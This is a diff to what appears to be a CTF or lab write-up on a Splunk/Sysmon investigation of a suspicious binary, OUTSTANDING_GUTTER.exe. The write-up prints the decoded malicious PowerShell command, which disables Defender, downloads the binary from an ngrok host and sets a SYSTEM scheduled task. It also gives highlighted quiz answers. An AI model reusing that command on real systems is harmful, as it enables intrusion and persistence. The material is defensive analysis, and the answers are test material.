@@ -28,13 +28,13 @@ Next, the `TargetFilename` field was investigated to determine the suspicious bi
 
 One of the files that stood out was `OUTSTANDING_GUTTER.exe` as the file name is unusual and it's saved in the `C:\Windows\Temp\` directory, one of the common staging areas that attackers use.
 
-However to further verify that this was the suspicious file, the process creation event from the file creation alert of the binary was investigated. To find this in the logs, the search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational ProcessGuid: {eea302a0-51cb-6282-d00e-000000000300} ProcessId: 10224  Description="Windows PowerShell"`
+However to further verify that this was the suspicious file, the process creation event from the file creation alert of the binary was investigated. To find this in the logs, the search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational ProcessGuid: {eea302a0-51cb-6282-d00e-000000000300} ProcessId: 10224`
 
-An encoded PowerShell command was discovered. With the help of dCode, the command was decoded as `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`.
+An encoded PowerShell command was discovered. With the help of dCode, the command was decoded as `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`. It must be noted that the URL has been defanged.
+
+Let's breakdown what the command does. This disables the real-time monitoring of MS Defender, download `OUTSTANDING_GUTTER.exe` from `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`, and it creates a scheduled task in which the binary will only run when an Event ID 777 appears.
 
 These evidences prove that <mark>`OUTSTANDING_GUTTER.exe`</mark> was the suspicious binary.
-
-What makes this more suspicious is that it disables the real-time monitoring of Microsoft Defender. Moreover it must be noted that the binary was also used in a scheduled task.
 
 ### 2. What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.
 
@@ -69,6 +69,8 @@ In order to locate the command, `Sysmon Event ID 1` as well as `OUTSTANDING_GUTT
 The command for configuring the binary was <mark>`"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f`</mark>.
 
 ### 5. What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)
+
+It's ran by the `NT AUTHORITY/SYSTEM`. The answer is <mark>`NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe`</mark>.
 
 ### 6. The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
 
